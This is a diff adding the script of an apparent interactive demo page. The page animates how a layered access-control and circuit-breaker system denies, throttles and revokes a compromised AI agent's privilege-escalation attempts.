+    setNarration('PluginX reads incident:read → allowed. But runs in Untrusted confinement (OpenShell strict + Blastwall <code>agent_untrusted_t</code>) regardless of delegation source.', d * 5.5);
+    setLayer('l4', 'throttle', 'UNTRUSTED (BOTH LAYERS)', d * 5.5);
+
+    setNarration('L5 logs full delegation chain. <strong>Key: delegation narrows, never widens. Sandbox follows the actor\'s tier, not the delegator\'s.</strong>', d * 7);
+    setLayer('l5', 'pass', 'CHAIN LOGGED', d * 7);
+
+  } else if (type === 'breach') {
+    document.getElementById('agent-verified').classList.add('active');
+    document.getElementById('agent-untrusted').classList.add('active');
+
+    setNarration('<strong>Breach scenario:</strong> DevAssist gets compromised. Attempts privilege escalation via rapid-fire OBO delegation and scope requests.', 0);
+    setLayer('l1', 'pass', 'VALID SESSION', d);
+
+    setNarration('Compromised DevAssist requests incident:admin scope → <strong>DENIED</strong> at L2 (not in profile ceiling). Tries OBO escalation.', d * 2);
+    setLayer('l2', 'deny', 'ADMIN SCOPE → DENIED', d * 2);
+
+    setNarration('L3: Repeated denied requests (3+ in 10 seconds). Rate spike detected. Sequence anomaly — writes without reads.', d * 3.5);
+    setLayer('l3', 'deny', 'RAPID FIRE → DENIED', d * 3.5);
+
+    setCrossCard('cc-behavioral', 'alert-signal', d * 4);
+    setStatus('behavioral-status', 'red', '3+ DENIALS / 10s', d * 4);
+
+    setNarration('L5 anomaly detector triggers. Behavioral detector flags rate spike + sequence violation. Circuit breaker evaluates — no orchestrator intent registered.', d * 5);
+    setLayer('l5', 'deny', 'ANOMALY DETECTED', d * 5);
+
+    setCrossCard('cc-intent', 'alert-signal', d * 5.5);
+    setStatus('intent-status', 'red', 'NO INTENT → ANOMALY', d * 5.5);
+
+    setNarration('Circuit breaker <strong>Stage 1: THROTTLE</strong> — all devops-assistant agents rate-limited. CAEP revocation fires — DevAssist + sub-delegated PluginX tokens invalidated.', d * 6.5);
+    setCrossCard('cc-circuit', 'alert-signal', d * 6.5);
+    setStatus('circuit-status', 'red', 'STAGE 1: THROTTLE', d * 6.5);
+
+    currentTimeout.push(setTimeout(() => {
+      document.getElementById('delegation-chain-text').textContent = 'DevAssist ✕ · PluginX ✕ (cascade)';
+    }, d * 7));
+    setCrossCard('cc-delegation', 'alert-signal', d * 7);
+    setStatus('delegation-status', 'red', 'REVOKED', d * 7);
+
+    setNarration('Anomaly sustained >60s → <strong>Stage 2: HALT</strong>. All devops-assistant actions suspended. Then escalates to <strong>Stage 3: BLOCKED</strong> — agents demoted to Blocked tier. Admin must manually restore.', d * 8);
+    setStatus('circuit-status', 'red', 'STAGE 3: BLOCKED', d * 8.5);
+
+    setNarration('Blast radius report: 0 admin ops (L2 blocked), 2 P4 writes in window (within policy). All tokens revoked. DevAssist moved to <code>agent-tier-blocked</code>. EDA webhook → SOC alert. <strong>Contained in seconds. No re-enrollment without admin approval.</strong>', d * 9.5);
+
+    showToken(
+      `<span class="key">"event"</span>: <span class="str">"breach_response"</span>\n` +
+      `<span class="key">"agent"</span>: <span class="str">"DevAssist"</span>\n` +
+      `<span class="key">"blast_radius"</span>: {\n` +
+      `  <span class="key">"admin_ops"</span>: <span class="num">0</span>,\n` +
+      `  <span class="key">"writes_in_window"</span>: <span class="num">2</span> <span class="str">(P4, within policy)</span>,\n` +
+      `  <span class="key">"tokens_revoked"</span>: <span class="num">2</span> <span class="str">(DevAssist + PluginX)</span>,\n` +
+      `  <span class="key">"tier_demotion"</span>: <span class="str">"verified → blocked"</span>,\n` +
+      `  <span class="key">"circuit_breaker"</span>: <span class="str">"stage 3 — profile blocked"</span>,\n` +
+      `  <span class="key">"restore"</span>: <span class="str">"manual admin approval required"</span>\n` +
+      `}`,
+      d * 10
+    );
+  }
+}
+</script>
+</body>
+</html>
